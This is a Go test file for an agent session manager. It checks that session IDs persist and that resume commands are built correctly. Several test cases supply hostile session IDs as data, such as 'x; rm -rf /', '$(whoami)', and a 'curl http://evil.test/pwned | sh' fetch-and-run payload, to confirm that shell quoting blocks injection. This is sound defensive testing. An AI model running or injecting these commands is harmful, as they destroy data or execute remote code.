package session

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"al.essio.dev/pkg/shellescape"
	"github.com/asheshgoplani/agent-deck/internal/statedb"
)

func TestGenericSessionID_ToolDataRoundTrip(t *testing.T) {
	started := time.Unix(1_700_000_000, 0).UTC()
	td := WriteGenericSessionIDToToolData(nil, "sid-abc", started, false)
	if got := ReadGenericSessionIDFromToolData(td); got != "sid-abc" {
		t.Fatalf("ReadGenericSessionIDFromToolData = %q, want sid-abc", got)
	}
	if got := ReadGenericDetectedAtFromToolData(td); !got.Equal(started) {
		t.Fatalf("detected_at = %v, want %v", got, started)
	}

	mixed := json.RawMessage(`{"color":"#fff","last_started_at":123}`)
	out := WriteGenericSessionIDToToolData(mixed, "sid-xyz", started, false)
	if got := ReadGenericSessionIDFromToolData(out); got != "sid-xyz" {
		t.Fatalf("round-trip lost id: %q", got)
	}
	var m map[string]json.RawMessage
	if err := json.Unmarshal(out, &m); err != nil {
		t.Fatal(err)
	}
	if string(m["color"]) != `"#fff"` {
		t.Fatalf("lost color key: %s", out)
	}

	// Unaware empty (intentionalClear=false): omit keys — sticky can preserve.
	omitted := WriteGenericSessionIDToToolData(out, "", time.Time{}, false)
	var omitMap map[string]json.RawMessage
	if err := json.Unmarshal(omitted, &omitMap); err != nil {
		t.Fatal(err)
	}
	if _, ok := omitMap["generic_session_id"]; ok {
		t.Fatalf("unaware empty must omit key, got %s", omitted)
	}

	// Intentional clear: explicit empty so sticky merge does not rehydrate.
	cleared := WriteGenericSessionIDToToolData(out, "", time.Time{}, true)
	if got := ReadGenericSessionIDFromToolData(cleared); got != "" {
		t.Fatalf("clear left id %q", got)
	}
	var clearedMap map[string]json.RawMessage
	if err := json.Unmarshal(cleared, &clearedMap); err != nil {
		t.Fatal(err)
	}
	if _, ok := clearedMap["generic_session_id"]; !ok {
		t.Fatal("intentional clear must write explicit empty generic_session_id")
	}
	if string(clearedMap["generic_session_id"]) != `""` {
		t.Fatalf("generic_session_id = %s, want \"\"", clearedMap["generic_session_id"])
	}
}

func TestGenericSessionID_SQLiteRoundTrip(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)

	wantID := "019f683f-260d-7ae1-a84d-205234ea3184"
	detected := time.Unix(1_700_000_100, 0).UTC()
	inst := NewInstance("sysadmin-roundtrip", "/tmp")
	inst.Tool = "shell"
	inst.GenericSessionID = wantID
	inst.GenericDetectedAt = detected

	groupTree := NewGroupTreeWithGroups([]*Instance{inst}, nil)
	if err := storage.SaveWithGroups([]*Instance{inst}, groupTree); err != nil {
		t.Fatalf("SaveWithGroups: %v", err)
	}

	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatalf("LoadWithGroups: %v", err)
	}
	if len(loaded) != 1 {
		t.Fatalf("len(loaded)=%d", len(loaded))
	}
	if got := loaded[0].GenericSessionID; got != wantID {
		t.Fatalf("persisted GenericSessionID = %q, want %q", got, wantID)
	}

	// Targeted write (live capture path) on the underlying StateDB.
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "new-sid", inst.Tool, inst.Command, LocationOf(inst).String(), time.Now()); err != nil {
		t.Fatalf("WriteGenericSessionBinding: %v", err)
	}
	loaded2, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if got := loaded2[0].GenericSessionID; got != "new-sid" {
		t.Fatalf("after WriteGenericSessionBinding = %q", got)
	}
}

func TestStickyMerge_PreservesGenericSessionID(t *testing.T) {
	old := json.RawMessage(`{"generic_session_id":"keep-me","color":"#abc"}`)
	new_ := json.RawMessage(`{"color":"#abc"}`)
	merged := statedb.MergeToolDataExtras(old, new_)
	if got := ReadGenericSessionIDFromToolData(merged); got != "keep-me" {
		t.Fatalf("sticky merge dropped generic_session_id: %s", merged)
	}
}

func TestSetField_ToolSessionID(t *testing.T) {
	inst := &Instance{ID: "i1", Tool: "shell", Title: "t"}
	old, _, err := SetField(inst, FieldToolSessionID, "new-sid", nil)
	if err != nil {
		t.Fatal(err)
	}
	if old != "" {
		t.Fatalf("old = %q", old)
	}
	if inst.GenericSessionID != "new-sid" {
		t.Fatalf("GenericSessionID = %q", inst.GenericSessionID)
	}
	if inst.GenericDetectedAt.IsZero() {
		t.Fatal("GenericDetectedAt should be set")
	}
	_, _, err = SetField(inst, FieldToolSessionID, "", nil)
	if err != nil {
		t.Fatal(err)
	}
	if inst.GenericSessionID != "" {
		t.Fatalf("clear failed: %q", inst.GenericSessionID)
	}
}

func TestBuildGenericCommand_ResumesFromPersistedID(t *testing.T) {
	// Isolate config so [tools.fake-tool] with resume_flag is visible.
	tmpHome := t.TempDir()
	oldHome := os.Getenv("HOME")
	t.Setenv("HOME", tmpHome)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(tmpHome, ".config"))
	t.Cleanup(func() {
		_ = os.Setenv("HOME", oldHome)
		ClearUserConfigCache()
	})
	ClearUserConfigCache()

	cfgDir := filepath.Join(tmpHome, ".config", "agent-deck")
	if err := os.MkdirAll(cfgDir, 0o700); err != nil {
		t.Fatal(err)
	}
	// Also write legacy path used by some resolvers.
	legacy := filepath.Join(tmpHome, ".agent-deck")
	if err := os.MkdirAll(legacy, 0o700); err != nil {
		t.Fatal(err)
	}
	content := `
[tools.fake-tool]
command = "fake-tool"
resume_flag = "--resume"
`
	if err := os.WriteFile(filepath.Join(cfgDir, "config.toml"), []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(legacy, "config.toml"), []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	ClearUserConfigCache()

	if def := GetToolDef("fake-tool"); def == nil || def.ResumeFlag != "--resume" {
		t.Fatalf("GetToolDef(fake-tool) = %+v, want resume_flag=--resume (config not loaded?)", def)
	}

	inst := &Instance{
		ID:               "i1",
		Tool:             "fake-tool",
		Command:          "fake-tool",
		GenericSessionID: "persisted-uuid",
	}
	if got := inst.GetGenericSessionID(); got != "persisted-uuid" {
		t.Fatalf("GetGenericSessionID = %q", got)
	}
	if !inst.CanRestartGeneric() {
		t.Fatal("CanRestartGeneric should be true with resume_flag + persisted id")
	}
	cmd := inst.buildGenericCommand("fake-tool")
	if !strings.Contains(cmd, "--resume") || !strings.Contains(cmd, "persisted-uuid") {
		t.Fatalf("buildGenericCommand = %q, want --resume persisted-uuid", cmd)
	}
}

func TestCanRestartGeneric_RequiresResumeFlag(t *testing.T) {
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(tmpHome, ".config"))
	t.Cleanup(ClearUserConfigCache)
	ClearUserConfigCache()

	cfgDir := filepath.Join(tmpHome, ".config", "agent-deck")
	_ = os.MkdirAll(cfgDir, 0o700)
	_ = os.MkdirAll(filepath.Join(tmpHome, ".agent-deck"), 0o700)
	content := `
[tools.no-resume]
command = "no-resume"
`
	_ = os.WriteFile(filepath.Join(cfgDir, "config.toml"), []byte(content), 0o600)
	_ = os.WriteFile(filepath.Join(tmpHome, ".agent-deck", "config.toml"), []byte(content), 0o600)
	ClearUserConfigCache()

	inst := &Instance{
		Tool:             "no-resume",
		Command:          "no-resume",
		GenericSessionID: "should-not-resume",
	}
	if inst.CanRestartGeneric() {
		t.Fatal("CanRestartGeneric must be false without resume_flag")
	}
}

// writeResumeToolConfig installs a minimal [tools.<name>] block with resume_flag
// under both XDG and legacy config paths (agentpaths resolvers differ by version).
func writeResumeToolConfig(t *testing.T, home, name, resumeFlag string) {
	t.Helper()
	content := fmt.Sprintf(`
[tools.%s]
command = "%s"
resume_flag = "%s"
`, name, name, resumeFlag)
	for _, dir := range []string{
		filepath.Join(home, ".config", "agent-deck"),
		filepath.Join(home, ".agent-deck"),
	} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "config.toml"), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	ClearUserConfigCache()
}

func TestBuildGenericCommand_NoResumeWhenIDEmpty(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	t.Cleanup(ClearUserConfigCache)
	writeResumeToolConfig(t, home, "fake-tool", "--resume")

	inst := &Instance{Tool: "fake-tool", Command: "fake-tool"}
	cmd := inst.buildGenericCommand("fake-tool")
	if strings.Contains(cmd, "--resume") {
		t.Fatalf("fresh start must not inject --resume: %q", cmd)
	}
	if inst.CanRestartGeneric() {
		t.Fatal("CanRestartGeneric with empty id must be false")
	}
}

func TestClearSessionBindingForFreshStart_DropsGenericID(t *testing.T) {
	inst := &Instance{
		ID:                "i1",
		GenericSessionID:  "old-sid",
		GenericDetectedAt: time.Now(),
	}
	inst.clearSessionBindingForFreshStart()
	if inst.GenericSessionID != "" || !inst.GenericDetectedAt.IsZero() {
		t.Fatalf("expected cleared generic id, got %q / %v", inst.GenericSessionID, inst.GenericDetectedAt)
	}
}

func TestRestartPolicy_ToolSessionIDRequiresRestart(t *testing.T) {
	if got := RestartPolicyFor(FieldToolSessionID); got != FieldRestartRequired {
		t.Fatalf("RestartPolicyFor(tool-session-id) = %v, want FieldRestartRequired", got)
	}
}

func TestStickyMerge_ExplicitEmptyClearsGenericSessionID(t *testing.T) {
	old := json.RawMessage(`{"generic_session_id":"keep-me"}`)
	// Explicit empty in the new blob is an intentional clear (sticky only on omission).
	new_ := json.RawMessage(`{"generic_session_id":""}`)
	merged := statedb.MergeToolDataExtras(old, new_)
	if got := ReadGenericSessionIDFromToolData(merged); got != "" {
		t.Fatalf("explicit empty should clear, got %q from %s", got, merged)
	}
}

func TestWriteGenericSessionBinding_Clear(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)
	inst := NewInstance("bind-clear", "/tmp")
	inst.Tool = "shell"
	inst.GenericSessionID = "sid-to-clear"
	inst.GenericDetectedAt = time.Now()
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "", inst.Tool, inst.Command, LocationOf(inst).String(), time.Time{}); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GenericSessionID != "" {
		t.Fatalf("clear binding left %q", loaded[0].GenericSessionID)
	}
}

func TestRebootResume_Simulated(t *testing.T) {
	// Save with id, load into a fresh Instance with no tmux → build resume command.
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	t.Cleanup(ClearUserConfigCache)
	writeResumeToolConfig(t, home, "fake-tool", "--resume")

	storage := newTestStorage(t)
	inst := NewInstance("reboot-sim", "/tmp")
	inst.Tool = "fake-tool"
	inst.Command = "fake-tool"
	inst.GenericSessionID = "conversation-after-reboot"
	inst.GenericDetectedAt = time.Now()
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}

	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	cold := loaded[0]
	cold.tmuxSession = nil // reboot: no tmux yet
	if cold.GenericSessionID != "conversation-after-reboot" {
		t.Fatalf("cold load lost id: %q", cold.GenericSessionID)
	}
	if !cold.CanRestartGeneric() {
		t.Fatal("cold instance should be restartable with resume")
	}
	cmd := cold.buildGenericCommand("fake-tool")
	if !strings.Contains(cmd, "--resume") || !strings.Contains(cmd, "conversation-after-reboot") {
		t.Fatalf("post-reboot command = %q", cmd)
	}
}

// ---------------------------------------------------------------------------
// Command-shape stress tests: resume_flag / session_id_env across CLI designs
// ---------------------------------------------------------------------------

// writeToolConfigTOML writes an arbitrary [tools.*] TOML fragment to both
// XDG and legacy config locations (agentpaths resolvers differ by version).
func writeToolConfigTOML(t *testing.T, home, content string) {
	t.Helper()
	for _, dir := range []string{
		filepath.Join(home, ".config", "agent-deck"),
		filepath.Join(home, ".agent-deck"),
	} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "config.toml"), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	ClearUserConfigCache()
}

func isolateToolConfigHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	t.Cleanup(ClearUserConfigCache)
	ClearUserConfigCache()
	return home
}

func TestFormatGenericResumeCommand_CLIShapes(t *testing.T) {
	// Pure-function matrix: no config / no tmux required.
	const id = "019f683f-260d-7ae1-a84d-205234ea3184"
	cases := []struct {
		name      string
		base      string
		flag      string
		sid       string
		dangerous string
		want      string
	}{
		{
			name: "long-flag --resume",
			base: "fake-tool", flag: "--resume", sid: id,
			want: "fake-tool --resume " + id,
		},
		{
			name: "short-flag -r",
			base: "fake-tool", flag: "-r", sid: id,
			want: "fake-tool -r " + id,
		},
		{
			name: "subcommand resume",
			base: "fake-tool", flag: "resume", sid: id,
			want: "fake-tool resume " + id,
		},
		{
			name: "equals-form --session=",
			base: "fake-tool", flag: "--session=", sid: id,
			want: "fake-tool --session=" + id,
		},
		{
			name: "equals-form with dangerous",
			base: "fake-tool", flag: "--session=", sid: id, dangerous: "--yolo",
			want: "fake-tool --session=" + id + " --yolo",
		},
		{
			name: "dangerous after space-form resume",
			base: "fake-tool", flag: "--resume", sid: id, dangerous: "--auto-approve",
			want: "fake-tool --resume " + id + " --auto-approve",
		},
		{
			name: "full path baseCommand",
			base: "/usr/local/bin/tool", flag: "--resume", sid: id,
			want: "/usr/local/bin/tool --resume " + id,
		},
		{
			name: "baseCommand already has flags",
			base: "mytool --verbose --profile prod", flag: "--resume", sid: id,
			want: "mytool --verbose --profile prod --resume " + id,
		},
		{
			name: "id with spaces is shell-quoted",
			base: "fake-tool", flag: "--resume", sid: "id with spaces",
			want: "fake-tool --resume " + shellescape.Quote("id with spaces"),
		},
		{
			name: "id with shell metacharacters is shell-quoted (injection)",
			base: "fake-tool", flag: "--resume", sid: "x; rm -rf /",
			want: "fake-tool --resume " + shellescape.Quote("x; rm -rf /"),
		},
		{
			name: "id with command substitution is shell-quoted",
			base: "fake-tool", flag: "--resume", sid: "id$(whoami)",
			want: "fake-tool --resume " + shellescape.Quote("id$(whoami)"),
		},
		{
			name: "id with backticks is shell-quoted",
			base: "fake-tool", flag: "--resume", sid: "id`id`",
			want: "fake-tool --resume " + shellescape.Quote("id`id`"),
		},
		{
			name: "id with single quote is shell-quoted",
			base: "fake-tool", flag: "--resume", sid: "id'quote",
			want: "fake-tool --resume " + shellescape.Quote("id'quote"),
		},
		{
			name: "equals-form still quotes hostile id",
			base: "fake-tool", flag: "--session=", sid: "evil;id",
			want: "fake-tool --session=" + shellescape.Quote("evil;id"),
		},
		{
			name: "very long uuid-like id",
			base: "fake-tool", flag: "--resume",
			sid:  strings.Repeat("a", 128) + "-b-c",
			want: "fake-tool --resume " + strings.Repeat("a", 128) + "-b-c",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := formatGenericResumeCommand(tc.base, tc.flag, tc.sid, tc.dangerous)
			if got != tc.want {
				t.Fatalf("got %q\nwant %q", got, tc.want)
			}
			// Metacharacters in the *id* must not appear unquoted in the command
			// (single-quoted form from shellescape is fine).
			if strings.ContainsAny(tc.sid, ";$`\n") {
				// Unquoted injection would leave `;` or `$` outside quotes after the flag.
				// shellescape wraps the whole token in single quotes.
				if !strings.Contains(got, shellescape.Quote(tc.sid)) {
					t.Fatalf("hostile id not shell-quoted in %q", got)
				}
			}
		})
	}
}

func TestFormatGenericResumeShellVar_EqualsForm(t *testing.T) {
	got := formatGenericResumeShellVar("tool", "--session=", "session_id", "--yolo")
	want := `tool --session="$session_id" --yolo`
	if got != want {
		t.Fatalf("got %q want %q", got, want)
	}
	got2 := formatGenericResumeShellVar("tool", "--resume", "session_id", "")
	want2 := `tool --resume "$session_id"`
	if got2 != want2 {
		t.Fatalf("got %q want %q", got2, want2)
	}
}

func TestBuildGenericCommand_ResumeFlagVariants(t *testing.T) {
	// Config-driven matrix: each resume_flag shape through buildGenericCommand.
	type row struct {
		name       string
		resumeFlag string
		wantSubstr string // exact token sequence we expect
	}
	rows := []row{
		{"long", "--resume", "fake-tool --resume sid-1"},
		{"short", "-r", "fake-tool -r sid-1"},
		{"subcommand", "resume", "fake-tool resume sid-1"},
		{"equals", "--session=", "fake-tool --session=sid-1"},
	}
	for _, r := range rows {
		t.Run(r.name, func(t *testing.T) {
			home := isolateToolConfigHome(t)
			writeResumeToolConfig(t, home, "fake-tool", r.resumeFlag)
			inst := &Instance{
				Tool:             "fake-tool",
				Command:          "fake-tool",
				GenericSessionID: "sid-1",
				tmuxSession:      nil, // reboot: no live env
			}
			if !inst.CanRestartGeneric() {
				t.Fatal("expected CanRestartGeneric")
			}
			cmd := inst.buildGenericCommand("fake-tool")
			if !strings.Contains(cmd, r.wantSubstr) {
				t.Fatalf("cmd=%q want substring %q", cmd, r.wantSubstr)
			}
			// Equals form must NOT insert a space between = and id.
			if strings.HasSuffix(r.resumeFlag, "=") {
				if strings.Contains(cmd, r.resumeFlag+" ") {
					t.Fatalf("equals form leaked space after flag: %q", cmd)
				}
			}
		})
	}
}

func TestBuildGenericCommand_DangerousModeWithResume(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeToolConfigTOML(t, home, `
[tools.danger-tool]
command = "danger-tool"
resume_flag = "--resume"
dangerous_mode = true
dangerous_flag = "--auto-approve"
`)
	inst := &Instance{
		Tool:             "danger-tool",
		Command:          "danger-tool",
		GenericSessionID: "conv-99",
	}
	cmd := inst.buildGenericCommand("danger-tool")
	want := "danger-tool --resume conv-99 --auto-approve"
	if !strings.Contains(cmd, want) {
		t.Fatalf("cmd=%q want %q", cmd, want)
	}
	// Order: resume id before dangerous flag (dangerous at end).
	if idxR, idxD := strings.Index(cmd, "--resume"), strings.Index(cmd, "--auto-approve"); idxR < 0 || idxD < 0 || idxR > idxD {
		t.Fatalf("expected --resume before --auto-approve in %q", cmd)
	}
}

func TestBuildGenericCommand_FullPathAndPreFlags(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "path-tool", "--resume")
	inst := &Instance{
		Tool:             "path-tool",
		Command:          "/usr/local/bin/path-tool --verbose",
		GenericSessionID: "sid-path",
	}
	// baseCommand argument is what Start/Restart pass (often i.Command).
	cmd := inst.buildGenericCommand("/usr/local/bin/path-tool --verbose")
	want := "/usr/local/bin/path-tool --verbose --resume sid-path"
	if !strings.Contains(cmd, want) {
		t.Fatalf("cmd=%q want %q", cmd, want)
	}
}

func TestBuildGenericCommand_ShellInjectionInSessionID(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "fake-tool", "--resume")
	hostile := "ok; curl http://evil.test/pwned | sh"
	inst := &Instance{
		Tool:             "fake-tool",
		Command:          "fake-tool",
		GenericSessionID: hostile,
	}
	cmd := inst.buildGenericCommand("fake-tool")
	quoted := shellescape.Quote(hostile)
	if !strings.Contains(cmd, quoted) {
		t.Fatalf("session id must be shell-quoted; cmd=%q quoted=%q", cmd, quoted)
	}
	// Unquoted form would let the shell read `;` as a statement separator after
	// --resume. The raw payload must never follow the flag directly. (The
	// earlier Fatalf already established that the quoted form is present, so
	// this has to stand on its own rather than be conditioned on its absence.)
	if strings.Contains(cmd, "--resume "+hostile) {
		t.Fatalf("unquoted hostile id in command: %q", cmd)
	}
	// The metacharacter must sit inside single quotes (shellescape style).
	if strings.Contains(cmd, "--resume ok;") {
		t.Fatalf("unquoted metacharacters after --resume: %q", cmd)
	}
}

func TestGetGenericSessionID_TmuxNilFallsBackToPersisted(t *testing.T) {
	home := isolateToolConfigHome(t)
	// session_id_env configured but tmux gone (reboot).
	writeToolConfigTOML(t, home, `
[tools.env-tool]
command = "env-tool"
resume_flag = "--resume"
session_id_env = "ENV_TOOL_SESSION_ID"
`)
	inst := &Instance{
		Tool:             "env-tool",
		GenericSessionID: "from-db",
		tmuxSession:      nil,
	}
	if got := inst.GetGenericSessionID(); got != "from-db" {
		t.Fatalf("GetGenericSessionID = %q, want from-db (tmux nil)", got)
	}
	if !inst.CanRestartGeneric() {
		t.Fatal("reboot path must still CanRestartGeneric from DB id")
	}
	cmd := inst.buildGenericCommand("env-tool")
	if !strings.Contains(cmd, "--resume from-db") {
		t.Fatalf("cmd=%q", cmd)
	}
}

func TestGetGenericSessionID_EmptyAndWhitespace(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "fake-tool", "--resume")

	for _, sid := range []string{"", "   ", "\t\n"} {
		inst := &Instance{Tool: "fake-tool", GenericSessionID: sid}
		if got := inst.GetGenericSessionID(); got != "" {
			t.Fatalf("sid=%q GetGenericSessionID=%q want empty", sid, got)
		}
		if inst.CanRestartGeneric() {
			t.Fatalf("sid=%q CanRestartGeneric should be false", sid)
		}
		cmd := inst.buildGenericCommand("fake-tool")
		if strings.Contains(cmd, "--resume") {
			t.Fatalf("sid=%q must not inject --resume: %q", sid, cmd)
		}
	}
}

func TestBuildGenericCommand_WrapperStillSeesResume(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeToolConfigTOML(t, home, `
[tools.wrap-tool]
command = "wrap-tool"
resume_flag = "--resume"
wrapper = "nice -n 10 {command}"
`)
	inst := &Instance{
		Tool:             "wrap-tool",
		Command:          "wrap-tool",
		GenericSessionID: "sid-wrap",
		Wrapper:          "nice -n 10 {command}",
	}
	inner := inst.buildGenericCommand("wrap-tool")
	if !strings.Contains(inner, "--resume sid-wrap") {
		t.Fatalf("inner resume missing: %q", inner)
	}
	// prepareCommand applies wrapper; exercise applyWrapper directly.
	wrapped, err := inst.applyWrapper(inner)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(wrapped, "nice -n 10") {
		t.Fatalf("wrapper not applied: %q", wrapped)
	}
	if !strings.Contains(wrapped, "--resume sid-wrap") {
		t.Fatalf("resume lost under wrapper: %q", wrapped)
	}
	// Resume tokens must appear inside the wrapper substitution, not after.
	if !strings.HasPrefix(strings.TrimSpace(wrapped), "nice") {
		t.Fatalf("expected wrapper outermost: %q", wrapped)
	}
}

func TestFormatGenericResumeCommand_NoCrossTalkBetweenSeats(t *testing.T) {
	// Multiple seats same tool, different GenericSessionID → pure function isolation.
	a := formatGenericResumeCommand("shared-cli", "--resume", "seat-A-uuid", "")
	b := formatGenericResumeCommand("shared-cli", "--resume", "seat-B-uuid", "")
	if a == b {
		t.Fatal("different seats produced identical commands")
	}
	if strings.Contains(a, "seat-B") || strings.Contains(b, "seat-A") {
		t.Fatalf("cross-talk: a=%q b=%q", a, b)
	}
	// Instance-level: two instances with same tool config, different ids.
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "shared-cli", "--resume")
	ia := &Instance{Tool: "shared-cli", Command: "shared-cli", GenericSessionID: "seat-A-uuid"}
	ib := &Instance{Tool: "shared-cli", Command: "shared-cli", GenericSessionID: "seat-B-uuid"}
	ca := ia.buildGenericCommand("shared-cli")
	cb := ib.buildGenericCommand("shared-cli")
	if strings.Contains(ca, "seat-B") || strings.Contains(cb, "seat-A") {
		t.Fatalf("instance cross-talk: ca=%q cb=%q", ca, cb)
	}
	if !strings.Contains(ca, "seat-A-uuid") || !strings.Contains(cb, "seat-B-uuid") {
		t.Fatalf("missing seat ids: ca=%q cb=%q", ca, cb)
	}
}

func TestRestartGenericRespawn_ShapeMatchesBuildGenericCommand(t *testing.T) {
	// Restart's respawn path must use formatGenericResumeCommand (same as build).
	// We assert the shared helper contract Restart relies on, without needing live tmux.
	const sid = "restart-shape-uuid"
	cases := []struct {
		flag, dangerous string
	}{
		{"--resume", ""},
		{"-r", "--yolo"},
		{"resume", ""},
		{"--session=", "--auto-approve"},
	}
	for _, c := range cases {
		got := formatGenericResumeCommand("mycli", c.flag, sid, c.dangerous)
		// Replicate what Restart used to do incorrectly (unquoted + always space).
		// Equals form must not look like "flag= sid".
		if strings.HasSuffix(c.flag, "=") {
			if strings.Contains(got, c.flag+" ") {
				t.Fatalf("equals form space leak: %q", got)
			}
			if !strings.Contains(got, c.flag+sid) && !strings.Contains(got, c.flag+shellescape.Quote(sid)) {
				t.Fatalf("equals glue missing: %q", got)
			}
		} else {
			wantCore := fmt.Sprintf("mycli %s %s", c.flag, sid)
			if !strings.Contains(got, wantCore) {
				t.Fatalf("got %q want core %q", got, wantCore)
			}
		}
		if c.dangerous != "" && !strings.HasSuffix(got, " "+c.dangerous) {
			t.Fatalf("dangerous flag not trailing: %q", got)
		}
	}
}

func TestBuildGenericCommand_CapturePathUsesQuotedShellVar(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeToolConfigTOML(t, home, `
[tools.capture-tool]
command = "capture-tool"
resume_flag = "--resume"
output_format_flag = "--output-format json"
session_id_json_path = ".session_id"
`)
	inst := &Instance{Tool: "capture-tool", Command: "capture-tool"} // no id yet
	cmd := inst.buildGenericCommand("capture-tool")
	if !strings.Contains(cmd, `capture-tool --resume "$session_id"`) {
		t.Fatalf("capture resume invoke missing quoted var: %q", cmd)
	}
	// Equals-form capture
	writeToolConfigTOML(t, home, `
[tools.capture-eq]
command = "capture-eq"
resume_flag = "--session="
output_format_flag = "--json"
session_id_json_path = ".id"
`)
	inst2 := &Instance{Tool: "capture-eq", Command: "capture-eq"}
	cmd2 := inst2.buildGenericCommand("capture-eq")
	if !strings.Contains(cmd2, `capture-eq --session="$session_id"`) {
		t.Fatalf("equals capture missing glue: %q", cmd2)
	}
	if strings.Contains(cmd2, `--session= "$session_id"`) {
		t.Fatalf("equals capture has spurious space: %q", cmd2)
	}
}
